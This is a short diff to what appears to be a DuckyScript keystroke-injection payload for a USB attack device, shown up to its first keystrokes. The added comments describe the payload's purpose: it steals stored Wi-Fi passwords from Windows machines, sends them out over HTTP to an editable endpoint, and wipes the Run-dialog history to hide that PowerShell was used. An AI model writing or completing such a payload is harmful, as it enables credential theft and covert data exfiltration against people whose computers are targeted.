@@ -12,6 +12,11 @@ REM |/\'..' /   / /                 /    /___ / /   | |_| |         `-.______ / 
 REM '  `'-'`|`-' /                 |         |\ \._,\ '/|_|                  `
 REM          '..'                  |_________| `--'  `"
 
+REM Steals wifi passwords (uptil win10, win11 needs admin for all passwords)
+REM Exfills it via http://127.0.0.1 (edit this)
+REM Cleans up last opened MRU listing ("powershell")
+REM Press button to close MS Edge.
+
 DELAY 1000
 GUI r
 DELAY 500
